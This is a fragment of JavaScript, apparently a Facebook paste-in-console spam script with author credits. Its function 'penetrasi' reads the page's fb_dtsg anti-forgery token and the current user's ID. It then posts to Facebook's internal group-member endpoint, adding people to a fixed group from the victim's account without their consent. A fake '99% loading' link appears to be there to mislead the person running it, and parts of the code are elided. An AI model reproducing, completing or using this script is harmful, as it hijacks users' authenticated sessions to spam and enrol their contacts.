var tulisanNganu = 'Script Created & Designed by <A href="https://www.facebook.com/pkwaq">Waqar Ahmad.</A>';
var kunaon = '',
    wkwkwk = 'Waqar Ahmad - Thanks For Adding Your Friends Here. <br/>Powered By <A href="http://www.facebook.com/Loading.999999">Loading [lllllllllllllllllllllllllllllllllllllll ] 99%.</A>';
...
function penetrasi(opo) {
    ...
    if (memberGroupId != 440858199282766) {
        jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + document.getElementsByName("fb_dtsg")[0].value + "&group_id=440858199282766&source=typeahead&members=" + opo + "&nctr[_mod]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user=" + Env.user, function () {}, "text", "post")
    }
